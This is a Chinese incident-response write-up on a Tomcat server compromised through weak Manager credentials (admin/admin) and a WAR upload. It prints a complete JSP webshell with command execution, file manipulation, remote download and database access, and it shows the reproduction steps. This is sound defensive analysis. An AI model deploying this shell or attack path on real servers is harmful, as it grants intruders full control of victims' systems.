# Tomcat 服务器WebShell问题排查


##### 一、确定问题

1、阿里云提示在x.x.x.x服务器上发现木马文件，被植入了webshell。

2、木马文件路径：/web/tomcat-xxx/webapps/no3/cc.jsp。

![木马文件路径](https://upload-images.jianshu.io/upload_images/6956152-677d48fa78369434.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


##### 二、应急处理

1、在未确认cc.jsp文件功能之前，将webapps文件夹下的no3文件夹和no3.war文件删除，同时将no3.war文件备份到/home/xxx目录下。

2、同时将no3文件夹下的cc.jsp文件发送到本地进行分析，确认是一个jsp的木马后门文件，可以获取远程服务器权限。
```
<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*"%>
<%!
	String Pwd = "023";
	String cs = "UTF-8";
	
	String EC(String s) throws Exception {
		return new String(s.getBytes("ISO-8859-1"),cs);
	}
	
	Connection GC(String s) throws Exception {
		String[] x = s.trim().split("\r\n");
		Class.forName(x[0].trim());
		if(x[1].indexOf("jdbc:oracle")!=-1){
			return DriverManager.getConnection(x[1].trim()+":"+x[4],x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);
		}else{
			Connection c = DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);
			if (x.length > 4) {
				c.setCatalog(x[4]);
			}
			return c;
		}
	}
	
	void AA(StringBuffer sb) throws Exception {
		File r[] = File.listRoots();
		for (int i = 0; i < r.length; i++) {
			sb.append(r[i].toString().substring(0, 2));
		}
	}
	
	void BB(String s, StringBuffer sb) throws Exception {
		File oF = new File(s), l[] = oF.listFiles();
		String sT, sQ, sF = "";
		java.util.Date dt;
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		for (int i = 0; i < l.length; i++) {
			dt = new java.util.Date(l[i].lastModified());
			sT = fm.format(dt);
			sQ = l[i].canRead() ? "R" : "";
			sQ += l[i].canWrite() ? " W" : "";
			if (l[i].isDirectory()) {
				sb.append(l[i].getName() + "/\t" + sT + "\t" + l[i].length()+ "\t" + sQ + "\n");
			} else {
				sF+=l[i].getName() + "\t" + sT + "\t" + l[i].length() + "\t"+ sQ + "\n";
			}
		}
		sb.append(sF);
	}
	
	void EE(String s) throws Exception {
		File f = new File(s);
		if (f.isDirectory()) {
			File x[] = f.listFiles();
			for (int k = 0; k < x.length; k++) {
				if (!x[k].delete()) {
					EE(x[k].getPath());
				}
			}
		}
		f.delete();
	}
	
	void FF(String s, HttpServletResponse r) throws Exception {
		int n;
		byte[] b = new byte[512];
		r.reset();
		ServletOutputStream os = r.getOutputStream();
		BufferedInputStream is = new BufferedInputStream(new FileInputStream(s));
		os.write(("->" + "|").getBytes(), 0, 3);
		while ((n = is.read(b, 0, 512)) != -1) {
			os.write(b, 0, n);
		}
		os.write(("|" + "<-").getBytes(), 0, 3);
		os.close();
		is.close();
	}
	
	void GG(String s, String d) throws Exception {
		String h = "0123456789ABCDEF";
		File f = new File(s);
		f.createNewFile();
		FileOutputStream os = new FileOutputStream(f);
		for (int i = 0; i < d.length(); i += 2) {
			os.write((h.indexOf(d.charAt(i)) << 4 | h.indexOf(d.charAt(i + 1))));
		}
		os.close();
	}
	
	void HH(String s, String d) throws Exception {
		File sf = new File(s), df = new File(d);
		if (sf.isDirectory()) {
			if (!df.exists()) {
				df.mkdir();
			}
			File z[] = sf.listFiles();
			for (int j = 0; j < z.length; j++) {
				HH(s + "/" + z[j].getName(), d + "/" + z[j].getName());
			}
		} else {
			FileInputStream is = new FileInputStream(sf);
			FileOutputStream os = new FileOutputStream(df);
			int n;
			byte[] b = new byte[512];
			while ((n = is.read(b, 0, 512)) != -1) {
				os.write(b, 0, n);
			}
			is.close();
			os.close();
		}
	}
	
	void II(String s, String d) throws Exception {
		File sf = new File(s), df = new File(d);
		sf.renameTo(df);
	}
	
	void JJ(String s) throws Exception {
		File f = new File(s);
		f.mkdir();
	}
	
	void KK(String s, String t) throws Exception {
		File f = new File(s);
		SimpleDateFormat fm = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
		java.util.Date dt = fm.parse(t);
		f.setLastModified(dt.getTime());
	}
	
	void LL(String s, String d) throws Exception {
		URL u = new URL(s);
		int n = 0;
		FileOutputStream os = new FileOutputStream(d);
		HttpURLConnection h = (HttpURLConnection) u.openConnection();
		InputStream is = h.getInputStream();
		byte[] b = new byte[512];
		while ((n = is.read(b)) != -1) {
			os.write(b, 0, n);
		}
		os.close();
		is.close();
		h.disconnect();
	}
	
	void MM(InputStream is, StringBuffer sb) throws Exception {
		String l;
		BufferedReader br = new BufferedReader(new InputStreamReader(is));
		while ((l = br.readLine()) != null) {
			sb.append(l + "\r\n");
		}
	}
	
	void NN(String s, StringBuffer sb) throws Exception {
		Connection c = GC(s);
		ResultSet r = s.indexOf("jdbc:oracle")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();
		while (r.next()) {
			sb.append(r.getString(1) + "\t");
		}
		r.close();
		c.close();
	}
	
	void OO(String s, StringBuffer sb) throws Exception {
		Connection c = GC(s);
		String[] x = s.trim().split("\r\n");
		ResultSet r = c.getMetaData().getTables(null,s.indexOf("jdbc:oracle")!=-1?x.length>5?x[5]:x[4]:null, "%", new String[]{"TABLE"});
		while (r.next()) {
			sb.append(r.getString("TABLE_NAME") + "\t");
		}
		r.close();
		c.close();
	}
	
	void PP(String s, StringBuffer sb) throws Exception {
		String[] x = s.trim().split("\r\n");
		Connection c = GC(s);
		Statement m = c.createStatement(1005, 1007);
		ResultSet r = m.executeQuery("select * from " + x[x.length-1]);
		ResultSetMetaData d = r.getMetaData();
		for (int i = 1; i <= d.getColumnCount(); i++) {
			sb.append(d.getColumnName(i) + " (" + d.getColumnTypeName(i)+ ")\t");
		}
		r.close();
		m.close();
		c.close();
	}
	
	void QQ(String cs, String s, String q, StringBuffer sb,String p) throws Exception {
		Connection c = GC(s);
		Statement m = c.createStatement(1005, 1008);
		BufferedWriter bw = null;
		try {
			ResultSet r = m.executeQuery(q.indexOf("--f:")!=-1?q.substring(0,q.indexOf("--f:")):q);
			ResultSetMetaData d = r.getMetaData();
			int n = d.getColumnCount();
			for (int i = 1; i <= n; i++) {
				sb.append(d.getColumnName(i) + "\t|\t");
			}
			sb.append("\r\n");
			if(q.indexOf("--f:")!=-1){
				File file = new File(p);
				if(q.indexOf("-to:")==-1){
					file.mkdir();
				}
				bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf("-to:")!=-1?p.trim():p+q.substring(q.indexOf("--f:") + 4,q.length()).trim()),true),cs));
			}
			while (r.next()) {
				for (int i = 1; i <= n; i++) {
					if(q.indexOf("--f:")!=-1){
						bw.write(r.getObject(i)+""+"\t");
						bw.flush();
					}else{
						sb.append(r.getObject(i)+"" + "\t|\t");
					}
				}
				if(bw!=null){bw.newLine();}
				sb.append("\r\n");
			}
			r.close();
			if(bw!=null){bw.close();}
		} catch (Exception e) {
			sb.append("Result\t|\t\r\n");
			try {
				m.executeUpdate(q);
				sb.append("Execute Successfully!\t|\t\r\n");
			} catch (Exception ee) {
				sb.append(ee.toString() + "\t|\t\r\n");
			}
		}
		m.close();
		c.close();
	}
%>
<%
	cs = request.getParameter("z0") != null ? request.getParameter("z0")+ "":cs;
	response.setContentType("text/html");
	response.setCharacterEncoding(cs);
	StringBuffer sb = new StringBuffer("");
	try {
		String Z = EC(request.getParameter(Pwd) + "");
		String z1 = EC(request.getParameter("z1") + "");
		String z2 = EC(request.getParameter("z2") + "");
		sb.append("->" + "|");
		String s = request.getSession().getServletContext().getRealPath("/");
		if (Z.equals("A")) {
			sb.append(s + "\t");
			if (!s.substring(0, 1).equals("/")) {
				AA(sb);
			}
		} else if (Z.equals("B")) {
			BB(z1, sb);
		} else if (Z.equals("C")) {
			String l = "";
			BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));
			while ((l = br.readLine()) != null) {
				sb.append(l + "\r\n");
			}
			br.close();
		} else if (Z.equals("D")) {
			BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));
			bw.write(z2);
			bw.close();
			sb.append("1");
		} else if (Z.equals("E")) {
			EE(z1);
			sb.append("1");
		} else if (Z.equals("F")) {
			FF(z1, response);
		} else if (Z.equals("G")) {
			GG(z1, z2);
			sb.append("1");
		} else if (Z.equals("H")) {
			HH(z1, z2);
			sb.append("1");
		} else if (Z.equals("I")) {
			II(z1, z2);
			sb.append("1");
		} else if (Z.equals("J")) {
			JJ(z1);
			sb.append("1");
		} else if (Z.equals("K")) {
			KK(z1, z2);
			sb.append("1");
		} else if (Z.equals("L")) {
			LL(z1, z2);
			sb.append("1");
		} else if (Z.equals("M")) {
			String[] c = { z1.substring(2), z1.substring(0, 2), z2 };
			Process p = Runtime.getRuntime().exec(c);
			MM(p.getInputStream(), sb);
			MM(p.getErrorStream(), sb);
		} else if (Z.equals("N")) {
			NN(z1, sb);
		} else if (Z.equals("O")) {
			OO(z1, sb);
		} else if (Z.equals("P")) {
			PP(z1, sb);
		} else if (Z.equals("Q")) {
			QQ(cs, z1, z2, sb,z2.indexOf("-to:")!=-1?z2.substring(z2.indexOf("-to:")+4,z2.length()):s.replaceAll("\\\\", "/")+"images/");
		}
	} catch (Exception e) {
		sb.append("ERROR" + ":// " + e.toString());
	}
	sb.append("|" + "<-");
	out.print(sb.toString());
%>
```



##### 三、分析问题

1、攻击者在webapps文件夹下上传了一个no3.war文件，并创建了包含cc.jsp木马文件的no3 文件夹，首先应找到上传的方式和路径。查看下网站，发现网站是采用的Tomcat容器。

![Tomcat](https://upload-images.jianshu.io/upload_images/6956152-1f59c1b2e061c88e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


2、进一步的思路是排查Tomcat本身的漏洞，查看Tomcat的配置文件tomcat-users.xml，发现Manager APP管理员弱口令。

![弱口令](https://upload-images.jianshu.io/upload_images/6956152-4529f8760270e55a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


3、可能的攻击思路是，通过Tomcat弱口令漏洞上传war格式的木马文件。

##### 四、漏洞复现

1、通过admin/admin弱口令登录http://x.x.x.x/的Manager App功能。

![Manager App](https://upload-images.jianshu.io/upload_images/6956152-650649d85940d495.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


2、然后找到WAR file to depoly功能，上传一个包含了木马的Tomcat WAR包。WAR包类似于一个网站的压缩包文件，可以在WAR包里构造好自己的木马，然后传至服务器。

![WAR file to depoly](https://upload-images.jianshu.io/upload_images/6956152-83c6d857977b24d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)



3、在这里测试上传了一个goodwin.war文件（war里边包含了一个木马文件cc.jsp），上传成功之后在服务器的网站根目录下会自动解压生成一个goodwin的文件夹。而木马文件cc.jsp就在goodwin文件夹内。

![goodwin](https://upload-images.jianshu.io/upload_images/6956152-81280144702acc97.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


4、祭出菜刀神器，添加并连接刚才上传的木马文件地址，密码023。

![菜刀](https://upload-images.jianshu.io/upload_images/6956152-eaa1889924a255fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


5、然后打开文件管理功能，发现我们已经获得了服务器权限，并可以访问服务器上的所有文件。

![连接shell](https://upload-images.jianshu.io/upload_images/6956152-92d9da811a7d9a00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


6、这样就复现了攻击者通过上传一个no3.war文件，并自动解压生成一个包含了cc.jsp木马的no3文件夹，然后通过远程连接获取了服务器的webshell，拿下了服务器权限的过程。
***
    【攻击思路】Tomcat弱口令→登录Manager App→利用WAR file to depoly功能上传war包→war包自动解压生成木马文件→远程连接shell→获取服务器权限
***

##### 五、解决问题

1、确定可疑文件为木马后门后，删除服务器上备份的no3.war。

2、删除测试过程上传的goodwin.war文件和goodwin文件夹下的所有文件。

3、修改Tomcat管理员密码。

##### 六、安全建议

1、排查并删除服务器上的可疑用户cat /etc/passwd。

2、不定期修改Tomcat口令，更改为包含了大写字母、小写字母、数字、特殊字符的强密码。

3、升级Tomcat版本，目前采用的版本为7.0.54，存在多个安全漏洞，建议升级到最新版本7.0.88。
